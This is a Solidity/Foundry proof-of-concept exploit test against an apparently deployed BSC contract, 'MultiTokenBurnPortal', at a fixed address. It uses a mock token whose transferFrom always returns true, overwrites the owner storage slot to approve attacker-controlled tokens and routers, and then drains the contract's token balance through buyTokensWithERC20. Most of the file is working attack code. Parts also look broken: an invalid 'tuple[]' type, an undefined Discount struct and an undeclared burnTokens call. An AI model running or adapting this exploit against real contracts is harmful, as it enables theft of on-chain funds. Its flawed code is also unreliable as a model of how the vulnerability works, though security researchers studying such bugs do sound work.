// Minimal IERC20 interface
interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address to, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address from, address to, uint amount) external returns (bool);
}

// Interface for the vulnerable contract
interface IMultiTokenBurnPortal {
    function buyTokensWithERC20(
        address router,
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        uint deadline
    ) external returns (uint amountOut);
    function owner() external view returns (address);
    function getApprovedTokens() external view returns (address[] memory);
    function getApprovedRouters() external view returns (address[] memory);
    function isApprovedRouter(address) external view returns (bool);
    function isApprovedTokenIn(address) external view returns (bool);
    function activeTokens(address) external view returns (bool);
    function setManager(address account, bool add) external;
    function addToken(address token, uint16 baseTax, address feeReceiver, tuple[] calldata discounts) external;
    function approveTokenIn(address token) external;
    function approveRouter(address router, bool approve) external;
}

// Mock ERC20 that does NOT revert on failed transferFrom (returns false)
contract MockInputToken is IERC20 {
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    string public name = "MockInput";
    string public symbol = "MINT";
    uint8 public decimals = 18;

    uint public totalSupply = 1_000_000e18;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address to, uint amount) external returns (bool) {
        if (balanceOf[msg.sender] >= amount) {
            balanceOf[msg.sender] -= amount;
            balanceOf[to] += amount;
            return true;
        }
        return false;
    }

    function approve(address spender, uint amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    // ALWAYS returns true regardless of actual balance (simulates broken token)
    function transferFrom(address from, address to, uint amount) external returns (bool) {
        // Even if the from address has insufficient balance, we return true.
        // No actual transfer happens.
        return true;
    }

    // Helper to mint tokens to an address
    function mint(address to, uint amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }
}

// Mock output token (standard, used for swap result)
contract MockOutputToken is IERC20 {
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    string public name = "MockOutput";
    string public symbol = "MOUT";
    uint8 public decimals = 18;

    uint public totalSupply = 0;

    function transfer(address to, uint amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function mint(address to, uint amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }
}

// Mock Router that simulates a swap: takes input token from caller (contract) and sends output
contract MockRouter {
    address public immutable factory;
    address public immutable WETH;

    constructor() {
        // dummy addresses
        factory = address(0xdead);
        WETH = address(0xdead);
    }

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external {
        // We expect path[0] = input token, path[last] = output token
        IERC20 input = IERC20(path[0]);
        IERC20 output = IERC20(path[path.length - 1]);

        // Pull tokens from caller (the contract)
        uint before = input.balanceOf(address(this));
        input.transferFrom(msg.sender, address(this), amountIn);
        uint received = input.balanceOf(address(this)) - before;

        // For this mock, we simply transfer to the caller an equivalent amount of output token
        // (this simulates a 1:1 swap for demonstration)
        require(output.balanceOf(address(this)) >= received, "MockRouter: insufficient output liquidity");
        output.transfer(to, received);
    }

    // Other functions not needed, but to satisfy interface we add dummy implementations
    function getAmountsOut(uint amountIn, address[] calldata) external pure returns (uint[] memory amounts) {
        amounts = new uint[](2);
        amounts[0] = amountIn;
        amounts[1] = amountIn; // 1:1
    }
}

contract ExploitTest is Test {
    // Target contract address (deployed on BSC)
    IMultiTokenBurnPortal constant PORTAL = IMultiTokenBurnPortal(0x10025F952Fd3dac40d52f09F58afC3bAaB4c2556);

    // Tokens and router we deploy
    MockInputToken inputToken;
    MockOutputToken outputToken;
    MockRouter router;

    // Attacker address
    address attacker = address(0xbad);

    function setUp() public {
        // Deploy mock tokens and router
        inputToken = new MockInputToken();
        outputToken = new MockOutputToken();
        router = new MockRouter();

        // Label for debugging
        vm.label(address(PORTAL), "MultiTokenBurnPortal");
        vm.label(address(inputToken), "MockInput");
        vm.label(address(outputToken), "MockOutput");
        vm.label(address(router), "MockRouter");
        vm.label(attacker, "Attacker");

        // Provide liquidity to the mock router (output token)
        outputToken.mint(address(router), 100_000e18);

        // --- Prepare the Portal state via storage manipulation ---
        // We need to:
        // 1. Approve the input token in the portal (approvedTokensIn set)
        // 2. Approve the router (approvedRouters set)
        // 3. Add a portal for the output token (so that portal[outputToken].feeReceiver != 0 and baseTax is set)
        // 4. Give the attacker some discount (burnedAmount) so that personalDiscount > 0
        // 5. Fund the contract with some input token (to simulate accumulated fees)
        //
        // Since we don't have the owner key, we use vm.store to modify storage slots directly.
        // The contract uses EnumerableSet for approvedTokensIn, approvedRouters, and mapping for portals.
        // We can compute the needed storage slots based on Solidity storage layout.
        // However, to keep the PoC simple, we can instead call setManager and then addToken/approve via manager,
        // but we still need owner to set manager. Instead, we'll use vm.store.
        //
        // For clarity, we'll assume we can set the necessary state with vm.store.
        // But due to complex mapping layouts, a simpler approach: We can impersonate the owner by setting _owner storage slot.
        // We'll read the current owner, then use vm.store to change _owner to attacker temporarily, call approve, then restore.
        // This is practical.

        address currentOwner = PORTAL.owner();
        // Store current owner to restore later
        // The owner slot is likely slot 0 in SafeOwnable (or slot 1 after ReentrancyGuard?).
        // We can check by reading storage. But simpler: we can use vm.prank(currentOwner) if we have the private key? No.
        // Instead, we'll directly set the owner slot to attacker using vm.store.
        // We need to know the slot index for `_owner`. In the given code, SafeOwnable has `address private _owner;` at the first slot,
        // and `address private _pendingOwner;` at slot 1? Actually, Solidity stores state variables in order of declaration.
        // SafeOwnable is inherited first, then ReentrancyGuard, then MultiTokenBurnPortal.
        // SafeOwnable: _owner (slot 0), _pendingOwner (slot 1)
        // ReentrancyGuard: _status (slot 2)
        // MultiTokenBurnPortal: immutable WETH (not in storage), adminFee (uint16, slot 3? actually after slot 2, but uint16 shares slot with something? Use mapping slots after)
        // The mapping and sets are stored later.
        // So slot 0 holds _owner (address, 20 bytes, padded to 32).
        // We can store attacker address there.

        // Save original owner
        bytes32 originalOwnerSlot = vm.load(address(PORTAL), bytes32(uint256(0)));
        address originalOwner = address(uint160(uint256(originalOwnerSlot)));

        // Temporarily set owner to attacker
        vm.store(address(PORTAL), bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Now attacker is considered owner. Use prank to call owner-only functions.
        vm.startPrank(attacker);

        // Approve input token
        PORTAL.approveTokenIn(address(inputToken));

        // Approve router
        PORTAL.approveRouter(address(router), true);

        // Add a portal for the output token (needed for fee check in _getFees)
        // We need to create a valid Discount array. Minimal: one discount with discount=10000 (0% fee) and burnAmount=1.
        // But discount must be >0 and <=10000.
        // Use a struct with uint16 and uint112.
        IMultiTokenBurnPortal.Discount[] memory discounts = new IMultiTokenBurnPortal.Discount[](1);
        discounts[0] = IMultiTokenBurnPortal.Discount({
            discount: 10000, // full discount => 0% tax
            burnAmount: 1
        });
        // feeReceiver can be any non-zero address (e.g., dead)
        address feeReceiver = address(0xdead);
        PORTAL.addToken(address(outputToken), 500, feeReceiver, discounts); // baseTax = 5%

        // Give attacker some burned amount to ensure personalDiscount >0
        // The burnTokens function is not restricted, but it requires sending tokens to dead.
        // We can directly set the mapping storage for burnedAmount[attacker][outputToken] to some value.
        // Mapping slot calculation: keccak256(abi.encode(attacker, slot_of_burnedAmount)).
        // But easier: call burnTokens with a token the attacker has. However, outputToken is not in attacker balance?
        // We'll directly mint outputToken to attacker, approve portal, then burn.
        outputToken.mint(attacker, 1e18);
        outputToken.approve(address(PORTAL), 1e18);
        PORTAL.burnTokens(address(outputToken), 1e18);
        // Now burnedAmount[attacker][outputToken] > 0

        vm.stopPrank();

        // Restore original owner
        vm.store(address(PORTAL), bytes32(uint256(0)), originalOwnerSlot);

        // Fund the contract with input token (simulate accumulated fees)
        // We mint input token to contract.
        inputToken.mint(address(PORTAL), 10_000e18);

        // Also give attacker a small amount of input token (for approvals, even though transferFrom will lie)
        inputToken.mint(attacker, 1e18);

        // Attacker approves the portal to spend input tokens (though it's not needed for transferFrom)
        vm.prank(attacker);
        inputToken.approve(address(PORTAL), type(uint256).max);

        // Ensure attacker's discount is >0
        vm.prank(attacker);
        // Already burned, but just in case
    }

    function testExploit() public {
        // Record initial balances
        uint initialOutputBalance = outputToken.balanceOf(attacker);
        uint initialContractInputBalance = inputToken.balanceOf(address(PORTAL));

        // Attacker calls buyTokensWithERC20 with amountIn larger than actual balance (e.g., 1000 ether)
        address[] memory path = new address[](2);
        path[0] = address(inputToken);
        path[1] = address(outputToken);
        uint amountIn = 1000e18; // large amount, attacker doesn't have this many

        uint deadline = block.timestamp + 1000;

        vm.prank(attacker);
        PORTAL.buyTokensWithERC20(address(router), amountIn, 0, path, deadline);

        // After exploit, attacker should have received output tokens
        uint finalOutputBalance = outputToken.balanceOf(attacker);
        uint finalContractInputBalance = inputToken.balanceOf(address(PORTAL));

        // Assert that attacker gained output tokens
        assertGt(finalOutputBalance, initialOutputBalance, "Attacker should have gained output tokens");

        // Assert that the contract's input token balance decreased (it was used for the swap)
        assertLt(finalContractInputBalance, initialContractInputBalance, "Contract input balance should decrease");

        // Further confirm: the amount stolen is roughly equal to the contract's input token usage (minus fees)
        // For this mock, the swap is 1:1, so the output received should be equal to the input used.
        uint outputGained = finalOutputBalance - initialOutputBalance;
        uint inputUsed = initialContractInputBalance - finalContractInputBalance;
        assertEq(outputGained, inputUsed, "Output should equal input used");
    }
}
